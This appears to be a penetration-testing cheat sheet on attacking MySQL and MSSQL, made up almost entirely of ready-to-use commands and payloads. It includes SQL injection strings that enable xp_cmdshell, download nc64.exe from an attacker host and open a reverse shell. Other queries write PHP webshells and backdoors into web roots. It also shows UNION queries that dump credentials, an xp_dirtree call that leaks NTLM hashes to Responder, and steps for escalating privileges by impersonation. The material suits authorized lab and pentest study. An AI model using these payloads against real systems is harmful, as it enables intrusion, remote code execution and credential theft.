# 🛢Attacking SQL

## SQLMap

SQLMAP example:

```
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3
```

By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port.

## Connecting to SQL service

To connect to mysql:

```bash
mysql -u julio -pPassword123 -h 10.129.20.13
```

On windows:

```
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

To connect to mssql:

```bash
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

{% code title="-windows-auth for alternative authentication" %}
```shell-session
mssqlclient.py -p 1433 julio@10.129.203.7 
```
{% endcode %}

## Default Databases

`MySQL` default system schemas/databases:

* `mysql` - is the system database that contains tables that store information required by the MySQL server
* `information_schema` - provides access to database metadata
* `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
* `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

`MSSQL` default system schemas/databases:

* `master` - keeps the information for an instance of SQL Server.
* `msdb` - used by SQL Server Agent.
* `model` - a template database copied for each new database.
* `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
* `tempdb` - keeps temporary objects for SQL queries.

## RCE

### MSSQL

For MSSQL on windows we can run any code in SQL injection: To get RCE:

{% code overflow="wrap" %}
```
';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- 
';EXEC xp_cmdshell "powershell wget http://<ip>/nc64.exe -o C:\Users\Public\nc64.exe";--
';EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.245 4444";--
```
{% endcode %}

Using Public folder as we know it is writeable by all users.

{% code overflow="wrap" %}
```
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE;
EXEC xp_cmdshell "powershell wget http://<ip>/nc64.exe -o C:\Users\Public\nc64.exe";
EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe <ip> <port>";
```
{% endcode %}

### MySQL

We can write a php file that will lead to command execution via a Web Application

```
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"
```

or with union:

```
' union select '<?php system($_GET["cmd"]); ?>' into outfile '/srv/http/shell.php' -- -
```

Windows:

```
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "C:/wamp/www/shell.php" 
```

## Useful Commands

**To check C directory:**

```
exec xp_dirtree 'c:\'
```

#### **To list databases:**

{% code title="Mysql" %}
```shell-session
SHOW DATABASES;
```
{% endcode %}

{% code title="MSSQL" %}
```
SELECT name FROM master.dbo.sysdatabases
```
{% endcode %}

#### To show tables

{% code title="MySQL" %}
```
SHOW TABLES;
```
{% endcode %}

{% code title="MSSQL" %}
```
SELECT table_name FROM <DATABASE>.INFORMATION_SCHEMA.TABLES
```
{% endcode %}

To concatenate columns:

{% code title="MSSQL" %}
```
union select 1,concat(username,':',password),3,4,5,6 from users--
```
{% endcode %}

**To show tables and their id:**

{% code overflow="wrap" %}
```
union select 1,(select string_agg(concat(name,':',id),'|') from streamio..sysobjects where xtype='u'),3,4,5,6-- -
```
{% endcode %}

**To test xp\_cmdshell:**

```
EXEC xp_cmdshell 'ping 10.10.14.8';
```

On target:

```bash
sudo tcpdump -i tun0 icmp
```

To Write a file:

{% code overflow="wrap" %}
```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
{% endcode %}

{% code title="Use ?cmd=whoami to use" overflow="wrap" %}
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```
{% endcode %}

#### To get hash:

Target:

{% code title="MSSQL" %}
```sql
EXEC master..xp_dirtree '\\10.10.14.113\share\'
```
{% endcode %}

Attacker:

```bash
sudo responder -A -I tun0
```

### Impersonation:

Check users we can impersonate:

{% code overflow="wrap" %}
```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```
{% endcode %}

To impersonate:

{% code title="Use master database" %}
```sql
EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
```
{% endcode %}

#### Verifying current user and role:

```sql
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

### Linked Database

```sql
SELECT srvname, isremote FROM sysservers
```

### Enable xp\_cmdshell

```
EXEC master.dbo.sp_configure 'show advanced options', 1;
RECONFIGURE;
```
